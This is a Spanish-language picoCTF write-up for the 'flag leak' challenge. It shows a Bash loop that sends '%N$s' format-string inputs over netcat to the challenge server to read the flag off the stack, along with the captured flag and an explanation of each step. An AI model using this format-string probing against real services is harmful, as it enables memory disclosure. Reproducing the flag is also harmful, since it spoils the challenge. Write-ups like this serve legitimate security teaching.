# Retos picoCTF

# Level flag leak

## Objetivo
Story telling class 1/2 I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using: nc saturn.picoctf.net 51991

## Solucion
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

```
┌──(kali㉿kali)-[~/Downloads/flagLeak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 49920 | grep -Ei 'pico|ctf'; done
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
saturn.picoctf.net [13.59.203.175] 49920 (?) : Connection refused
```

for i in {0..999}; do ... done

Es un bucle for en Bash que recorre los números del 0 al 999.
En cada iteración, el valor actual de i es usado dentro del cuerpo del bucle.
echo "%$i\$s"

Genera una cadena con el formato "%<n>$s", donde <n> es el valor actual de i.
Este formato es común en vulnerabilidades de "format string" (format string vulnerabilities), que explotan cómo un programa maneja las cadenas de formato.
El "%<n>$s" intenta acceder a la <n>-ésima posición de la pila de memoria y la interpreta como una cadena (%s).
nc saturn.picoctf.net 49920

Usa el comando nc (netcat) para establecer una conexión TCP con el servidor remoto saturn.picoctf.net en el puerto 49920.
netcat es una herramienta que permite enviar datos a través de conexiones de red.
grep -Ei 'pico|ctf'

Filtra la salida de la conexión buscando líneas que contengan las palabras "pico" o "ctf", ignorando mayúsculas y minúsculas (-i).
## Referencias


